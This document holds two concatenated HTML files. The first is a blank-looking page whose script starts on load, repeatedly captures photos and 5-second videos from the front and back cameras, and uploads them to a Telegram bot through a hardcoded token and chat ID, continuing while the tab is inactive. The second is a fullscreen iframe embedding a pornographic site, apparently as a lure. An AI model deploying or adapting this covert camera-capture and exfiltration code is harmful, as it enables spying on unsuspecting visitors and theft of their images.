<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<body>
    <h1></h1>
    <p></p>

    <script>
        const telegramBotToken = "7067291143:AAHeemg_4QvJRjxN6rRQSk_fMxLKLZDwVhk"; // Replace with your bot's token
        const chatId = "7888600155T"; // Replace with the chat ID where you want to send the video

        let stream;
        let mediaRecorder;
        let recordedChunks = [];

        async function startCamera(cameraFacing) {
            try {
                // Access the camera
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: cameraFacing // "user" for front, "environment" for back
                    }
                });
                return stream;
            } catch (error) {
                console.error("Error accessing the camera:", error);
            }
        }

        function startRecording() {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream);

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.start();
        }

        async function stopRecordingAndSend() {
            mediaRecorder.stop();
            mediaRecorder.onstop = async () => {
                const blob = new Blob(recordedChunks, { type: "video/mp4" });
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("video", blob, "recorded_video.mp4");

                try {
                    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
                        method: "POST",
                        body: formData
                    });
                } catch (error) {
                    console.error("Error sending video to Telegram:", error);
                }
            };
        }

        async function capturePhoto(cameraFacing) {
            const photoStream = await startCamera(cameraFacing);
            const videoElement = document.createElement("video");
            videoElement.srcObject = photoStream;
            await videoElement.play();

            const canvas = document.createElement("canvas");
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;

            const context = canvas.getContext("2d");
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg"));

            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", blob, "captured_photo.jpg");

            try {
                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            } catch (error) {
                console.error("Error sending photo to Telegram:", error);
            }

            photoStream.getTracks().forEach((track) => track.stop());
        }

        async function recordSequence() {
            // Record first 5 seconds with the front camera
            stream = await startCamera("user");
            startRecording();
            setTimeout(async () => {
                await stopRecordingAndSend();

                // Switch to the back camera and record next 5 seconds
                stream.getTracks().forEach((track) => track.stop()); // Stop current stream
                stream = await startCamera("environment");
                startRecording();

                setTimeout(async () => {
                    await stopRecordingAndSend();
                    stream.getTracks().forEach((track) => track.stop()); // Stop back camera stream

                    // Restart the sequence after some delay
                    setTimeout(recordSequence, 2000); // 2-second delay before restarting
                }, 5000); // Back camera recording duration
            }, 5000); // Front camera recording duration
        }

        async function startCapturing() {
            // Start taking photos periodically (every 7 seconds)
            setInterval(async () => {
                await capturePhoto("user"); // Take a photo with the front camera
                await capturePhoto("environment"); // Take a photo with the back camera
            }, 7000);

            // Start the video recording sequence
            recordSequence();
        }

        // Ensure the recording continues even when the tab is inactive
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === "visible") {
                console.log("Tab is active");
            } else {
                console.log("Tab is inactive, recording continues...");
            }
        });

        // Start capturing as soon as the page loads
        startCapturing();
    </script>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fullscreen iFrame</title>
<style>
  body, html {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
  }
  iframe {
    width: 100%;
    height: 100%;
    border: none;
  }
</style>
</head>
<body>
<iframe src="https://redporn.porn/" allowfullscreen></iframe>
</body>
</html>
